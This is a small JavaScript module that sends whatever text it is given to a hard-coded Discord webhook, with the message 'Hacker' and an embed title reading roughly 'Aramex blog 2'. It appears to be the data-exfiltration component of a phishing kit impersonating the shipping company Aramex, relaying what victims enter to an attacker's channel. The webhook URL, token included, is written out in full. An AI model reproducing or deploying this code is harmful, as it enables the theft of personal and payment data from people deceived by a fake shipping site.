import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323757997775917198/auymgjLxrHKpTRl-JGILUX3CLQYgWxYs-1DJKy0IvriE8iA9m48_IcrjUvG-garbssoC",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
